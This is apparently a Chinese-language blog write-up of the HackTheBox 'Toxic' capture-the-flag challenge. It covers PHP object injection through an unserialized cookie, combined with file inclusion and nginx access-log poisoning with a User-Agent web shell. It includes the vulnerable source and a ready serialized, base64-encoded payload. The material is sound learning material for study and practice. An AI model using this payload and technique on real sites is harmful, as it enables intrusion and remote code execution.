---
title: HackTheBox Toxic WriteUP
date: 2023-08-23 09:39:14
tags:
- HackTheBox
- Web
---

## 题目

> Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸

![Toxic](image.png)

![Web](image-1.png)

## 思路

源代码很简单，只有两个PHP文件

``` php
//index.php

<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

``` php
//PageModel.php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

很显然，是一个PHP反序列化+文件包含的漏洞利用。

这里就需要找到一个可包含的日志文件，我们可以在`nginx.conf`中找到AccessLog文件的位置。

![AccessLog](image-2.png)

## 解题

利用`User-Agent`写入WebShell：

![UA](image-3.png)

构造包含AccessLog的序列化数据：

``` php
O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
//base64encode
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
```

利用WebShell获得文件名和Flag

![FileName](image-4.png)

![Flag](image-5.png)

## 后记

非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。

## 参考资料

> - [php反序列化完整总结](https://xz.aliyun.com/t/12507)